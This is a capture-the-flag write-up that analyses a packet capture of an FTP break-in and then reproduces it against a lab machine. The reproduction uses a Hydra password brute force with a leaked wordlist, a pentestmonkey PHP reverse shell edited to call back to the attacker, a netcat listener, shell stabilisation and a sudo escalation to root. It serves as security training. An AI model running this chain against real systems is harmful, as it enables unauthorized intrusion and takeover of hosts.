# Scenario

It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it.

## Q & A

1. The attacker is trying to log into a specific service. What service is this?
   *FTP*

> Scrolling down to frame number 145 until 160, we will see multiple login attempts with different passwords:
> ![5fac2dee808c1d7c243ab9195fcb8dfd.png](/resources/b177639bf57c4a4ca8110afb9ec4ee1d.png)
> Scrolling down a bit more to frame number 177, we will see the failed login reponses from the server:

2. There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?
   *Hydra*

3. The attacker is trying to log on with a specific username. What is the username?
   *`jenny`*

> Frame 214 shows the username in the request.

4. What is the user's password?
   *`password123`*

> Start by filtering for FTP traffic only, then look for a successful login. The frame before the successful login will have the password. We can find this interaction on frames 394 and 395.

5. What is the current FTP working directory after the attacker logged in?
   *`/var/www/html`*

> Start following the frames after the successful login from question 4. On frame 401, we will find the directory after the attacker ran the Print Working Directory (`PWD`) command:
> ![de8488449f5ab262c44ff4fe70e8a934.png](/resources/d4c1a64b0932467ebf29dfe782967b76.png)

6. The attacker uploaded a backdoor. What is the backdoor's filename?
   *`shell.php`*

> On frame 425, we will find the command `STOR` used to upload a file, `shell.php`:

7. The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
   *`http://pentestmonkey.net/tools/php-reverse-shell`*

> We can extract the `shell.php` file for analysis by going to the "File" menu, mouseover "Export Objects" and click on "FTP-DATA". In the Export object list window, confirm the filename and click the "Save" button:
> ![f437f23c781b44db639fb25aa9f6890a.png](/resources/f999ce8cb235455ea06a3efa47351833.png)
> Inside the `shell.php` file we will find the author of the shell script and search for the URL online:
> ![334b20dbb4d9f68effe9e0033020493c.png](/resources/c6aaea3496a74c928807f268a33a1fc5.png)

8. Which command did the attacker manually execute after getting a reverse shell?
   *`whoami`*

> Clear any filters and scroll down to frame 450. This is where the interaction with the reverse shell that was uploaded to the FTP begins.
> Starting from frame 455, where the `PSH` flag is set, right-click on this frame, mouseover "Follow" then click on "TCP Stream". This will show the entire conversation with the reverse shell:
> ![406d98bc46beac70976c6ea1be56141b.png](/resources/7a4d7b9bac9f4db580dbbdefa18e01fd.png)

9. What is the computer's hostname?
   *`wir3`*

> Answer can be found from the same conversation as question 8.

10. Which command did the attacker execute to spawn a new TTY shell?
    *`python3 -c 'import pty; pty.spawn("/bin/bash")'`*

> Answer can be found from the same conversation as question 8.

11. Which command was executed to gain a root shell?
    *`sudo su`*

> Answer can be found from the same conversation as question 8.

12. The attacker downloaded something from GitHub. What is the name of the GitHub project?
    *`Reptile`*

> Answer can be found from the same conversation as question 8.

13. The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
    *Rootkit*

> Check the GitHub repo.

# Scenario

Deploy the machine.

The attacker has changed the user's password! Can you replicate the attacker's steps and read the `flag.txt`? The flag is located in the `/root/Reptile` directory. Remember, you can always look back at the `.pcap` file if necessary. Good luck!

# Enumeration

## \[+] 10.10.106.165 - h4cked.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.106.165 h4cked.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.106.165
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 21 - FTP

Let's retrace the steps of the attacker by brute forcing the login to the FTP server using [Hydra](https://github.com/vanhauser-thc/thc-hydra) with [this wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-10.txt) and the username `jenny`:

```sh
hydra -l jenny -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ftp://h4cked.thm
```

After a moment we should have the password:

![153338b0b0bda78941abbf1144fe8612.png](/resources/e3d42b7f8a1c46f0b61f89714c0e1189.png)

We can login using the [ftp](https://linux.die.net/man/1/ftp) command and enter the password when prompted:

```sh
ftp jenny@h4cked.thm
ls -lah
```

![3783bea107800be8bd73c50619e584d5.png](/resources/96a6f907fc6041eeb0dc828db0897ecf.png)

We can replace `shell.php` with our own reverse shell script. You can either download and modify the one on this server using `get shell.php` or download the PHP reverse shell from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) and edit the `<ATTACKER_IP>` on line 177:

![9d3125232ab39d5d1adc28f8dca73e67.png](/resources/ca0f8819ce8f4258ae2fa943830faa39.png)

After editing the file, save it and use the FTP to upload it onto the server and use `chmod` to give the file proper permissions for access:

```sh
put shell.php
chmod 777 shell.php
```

Then run the `exit` command when the upload has finished.

# Initial Foothold

## Port 80 - HTTP

### \[-] h4cked.thm/shell.php

Before we can access our reverse shell script, we need to start the [Netcat](https://linux.die.net/man/1/nc) listener:

```sh
nc -nvlp 4444
```

Then use [curl](https://linux.die.net/man/1/curl) to make a request to our `shell.php` script:

```sh
curl -vvv h4cked.thm/shell.php
```

### \[-] www-data\@wir3

Back on the terminal running the Netcat listener, we should have a connection back from the victim machine:

![5a5d999185acefc13b3886cdfba277b1.png](/resources/09b63eeabf5d47e1991e86266358a58e.png)

Let's stablize the shell we just got by doing the following steps:

1. Use Python to spawn a stable shell:
   ```sh
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```
2. `CTRL+Z` to background the current shell
3. Fix echoing and foregrounds the shell:
   ```sh
   stty raw -echo;fg
   ```
4. Set terminal to use 256 colors:
   ```sh
   export TERM=xterm-256color
   ```

# Privilege Escalation

### \[-] jenny\@wir3

After stabilizing the shell, we can use the `su` command along with the same password from the FTP to log in as the user `jenny`:

```sh
su jenny
```

When we check our sudo permissions with `sudo -l`, we will find that we have full permissions which means we are essentially root.

![0a998b946204605f03e2dfef37ea0fbb.png](/resources/7109dcd328b34fd696d6c2885f295d11.png)

Running another `bash` shell along with `sudo` will allow us to run commands as root:

![6c8bcb8336b077c189e9671c2ba5fb9d.png](/resources/25b08bbfaaf949f9ac2808cef041d0cf.png)

We can find the flag in `/root/Reptile/flag.txt`:

![cad083bf085fb1e6ac4081c44106857f.png](/resources/d1754d1f20c5437d9929a6a7f0b903e7.png)
